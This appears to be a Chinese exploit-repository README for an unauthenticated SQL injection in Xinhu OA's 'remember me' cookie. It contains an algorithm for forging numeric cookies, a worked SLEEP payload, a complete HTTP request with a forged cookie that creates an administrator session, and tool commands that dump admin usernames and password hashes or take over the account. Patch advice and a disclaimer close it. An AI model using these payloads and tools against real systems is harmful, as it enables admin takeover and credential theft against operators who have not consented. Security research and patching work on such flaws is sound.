# 信呼OA 自动登录Cookie前台SQL注入漏洞

## 漏洞概述

信呼OA（xinhu / rockoa）的"记住我"自动登录功能存在前台SQL注入。攻击者**无需任何账号**，
通过伪造自动登录 Cookie 即可触发SQL注入，可进一步伪造管理员会话接管系统、读取数据库敏感数据。

| 项目 | 说明 |
|---|---|
| 影响版本 | 信呼OA <= V2.7.6 |
| 修复版本 | V2.7.7（官方已发布） |
| 漏洞类型 | SQL注入（前台/未授权） |
| 利用前置 | 无需任何有效账号 |
| 危害 | 管理员会话接管、任意数据读取 |

## 漏洞原理

### 1. 注入点

自动登录逻辑 `webmain/model/loginModel.php`：

```php
$tokans = $this->rock->jm->uncrypt($this->rock->cookie('mo_adminid')); // 解密cookie
if(!isempt($tokans)){
    $onrs = $this->getone("`token`='$tokans'", '`name`,`token`,`id`,`uid`'); // 直接拼接SQL
    if($onrs){
        $this->setsession($onrs['uid'], $onrs['name'], $onrs['token']); // 查询结果直接决定会话身份
    }
}
```

最终SQL：

```sql
SELECT `name`,`token`,`id`,`uid` FROM [前缀]logintoken WHERE `token`='[cookie解密值]' LIMIT 1
```

该入口（`ActionNot::mweblogin`）位于 `we/index`、`public` 等前台免认证页面，请求即触发。

### 2. 三个叠加缺陷

**缺陷一：登录令牌编码无密钥参与。** 系统使用自研可逆编码（`include/chajian/jmChajian.php`）写入Cookie，
其解密函数 `uncrypts()` 存在密钥无关通道：

```php
$ha = substr($st,$j,1);
if(isset($a[$ha]))$ha = $a[$ha] - $r;  // 仅字母表(a-z)内字符被映射
$sa .= $ha;                               // 数字字符原样直通,不经过字母表
$sa = (int)$sa;
$nstr .= chr($sa);                        // chr()对超256的值取模256
```

- 数字字符不在字母表中，**直通解码**，与配置密钥 `randkey` 完全无关；
- `chr()` 的取模特性使任意字符都能表示为"字符编码值+256k"（选取k使十进制不含分隔符`0`）。

因此任意payload均可编码为**纯数字Cookie**，目标无论是否配置 `randkey` 均可伪造。

### Cookie伪造算法详解

**服务端解码流程**（`uncrypt` 的三步）：

```
Cookie按'0'切段        "357 0 366 0 111 0 73 0 ..."
每段转整数,chr(整数%256)   357->chr(101)='e', 366->chr(110)='n', 111->'o', 73->'I'
拼接 -> 变形base64串     "enonI..."
还原 !→+ .→/ :→= 后base64解码  -> 明文payload
```

**伪造即反向计算**：对明文base64后的每个字符 `c`，找一个十进制**不含'0'**（'0'是段分隔符）
且模256等于 `ord(c)` 的整数——`ord(c)` 本身含'0'时，加256重试：

| 字符 | ord | ord含'0'? | 计算 | 编码段 | 服务端还原 |
|---|---|---|---|---|---|
| `'e'` | 101 | 是 | 101+256=**357** | `357` | chr(357%256)=chr(101)='e' |
| `'F'` | 70 | 是 | 70+256=**326** | `326` | chr(326%256)=chr(70)='F' |
| `'I'` | 73 | 否 | 直接用 | `73` | chr(73)='I' |
| `'0'` | 48 | 否 | 直接用（"48"不含'0'） | `48` | chr(48)='0' |
| `'x'` | 120 | 是 | 120+256=**376** | `376` | chr(376%256)=chr(120)='x' |

所有段用 `'0'` 连接，末尾追加 `'0'5`（偏移量5，仅字母映射使用，纯数字段不涉及）。

**SLEEP验证payload完整算例**（`forge.py --demo` 可自动演示全过程）：

```
注入明文:  zz' UNION SELECT IF((1=1),SLEEP(3),0),'a',9,1#

服务端最终SQL:
  SELECT name,token,id,uid FROM [前缀]logintoken
   WHERE token='zz' UNION SELECT IF((1=1),SLEEP(3),0),'a',9,1#' LIMIT 1

明文 -> 变形base64:
  enonIFVOSU9OIFNFTEVDVCBJRigoMT0xKSxTTEVFUCgzKSwwKSwnYScsOSwxIw::

逐字符编码(节选):
  'e'=101(含0) -> 357    'n'=110(含0) -> 366    'o'=111 -> 111(直接)
  'I'=73 -> 73           'F'=70(含0) -> 326     'V'=86 -> 86
  ...

拼装结果(纯数字Cookie):
  357 0 366 0 111 0 366 0 73 0 326 0 ... 0 5
  (去掉间隔即: 3570366011103660730326...05)

使用:
  Cookie: xinhu_mo_adminid=3570366011103660730326...05
  -> 服务端解码还原payload -> 条件为真SLEEP(3) -> 响应延迟3秒 = 漏洞存在
```

**缺陷二：Cookie输入不受过滤。** 全局参数过滤仅覆盖GET/POST，`rockClass::cookie()` 直读
`\$_COOKIE`；数据库层的 `filterstr` 调用在 `getsql()` 中已被注释。

**缺陷三：查询结果直接决定会话身份。** `setsession()` 将查询行的 `uid` 写入会话，
注入UNION伪造 `uid=1` 即可无需口令直接成为管理员。

### 3. 利用链

```
伪造纯数字Cookie(xinhu_mo_adminid)
-> 前台免认证页面 we/index 触发自动登录
-> 解密值拼入 WHERE token='...' (SQL注入)
-> UNION伪造 uid=1 行 -> setsession -> 管理员会话
-> 读取数据库任意数据(用户/口令哈希等)
```

## 数据包POC

**包1：注入·会话接管**（前台入口，无需任何凭证）

```http
GET /index.php?d=we&m=index HTTP/1.1
Host: TARGET
Cookie: xinhu_mo_adminid=357036601110366073032608607908308505707907303260780326084069086068086067065036608603640860770840364057085082086078085074012101190366086069057076086036206903660760680363011507708307705805
User-Agent: Mozilla/5.0
Connection: close
```

该Cookie为纯数字（服务端解密后即下方SQL），解密后的注入语句：

```sql
SELECT `name`,`token`,`id`,`uid` FROM [前缀]logintoken
WHERE `token`='zz' UNION SELECT 'VULN_TEST','TOKV1',9,1#' LIMIT 1
```

响应返回 `Set-Cookie: PHPSESSID=xxx` 即为伪造的管理员会话（uid=1）。

**包2：会话重放·身份确认**（PHPSESSID 取自包1响应）

```http
GET /index.php?d=we&m=logn&randkey=p HTTP/1.1
Host: TARGET
Cookie: PHPSESSID=从包1响应Set-Cookie中获取
User-Agent: Mozilla/5.0
Connection: close
```

页面渲染出管理员真实姓名即确认会话接管成功。

> 说明：Cookie名为 `{qom}mo_adminid`，qom 前缀见目标 `webmain/webmainConfig.php`（默认 `xinhu_`）。

## 验证/利用工具

```bash
# 漏洞验证(时间盲注, 延迟约3秒即存在漏洞)
python3 poc.py -t http://target/

# 任意SQL查询(布尔通道逐字符提取)
python3 exp.py -t http://target/ --sql "SELECT version()"
python3 exp.py -t http://target/ --sql "SELECT GROUP_CONCAT(user) FROM xinhu_admin"
python3 exp.py -t http://target/ --sql "SELECT CONCAT(user,'=',pass) FROM xinhu_admin WHERE id=1"

# 管理员会话接管
python3 exp.py -t http://target/ --takeover

# Cookie伪造器(任意payload -> 纯数字Cookie)
python3 forge.py "任意payload"
python3 forge.py "任意payload" --show   # 显示逐字符计算过程
python3 forge.py --demo                 # SLEEP示例完整演示(含服务端SQL与编码全过程)
```

## 复现环境

- 信呼OA V2.7.6（gitee.com/rainrock/xinhu，tag v2.7.6）
- PHP + MySQL，导入 `webmain/install/rockxinhu.sql`，配置 `webmain/webmainConfig.php`
- 默认配置即可复现；配置了随机 randkey 的目标同样可复现（见原理·缺陷一）

## 修复建议

1. **立即升级至 V2.7.7 或更高版本**（官方对token值增加了字符白名单校验）；
2. 自动登录令牌应改为服务端生成的随机数并入库比对，不应接受客户端可构造的确定性编码值；
3. 相关查询全部参数化，废弃字符串拼接；
4. 如需保留编码格式，为令牌增加带服务端密钥的完整性校验（如HMAC）。

## 免责声明

本仓库内容仅用于授权安全测试、安全研究与防御目的。使用本仓库提供的任何信息或工具
对未经授权的系统进行测试均属违规行为，由此产生的一切后果与作者无关。请在使用前
确认已获得目标系统所有者的明确授权。

## 参考

- 信呼OA官网：http://www.rockoa.com/
- 源码仓库：https://gitee.com/rainrock/xinhu
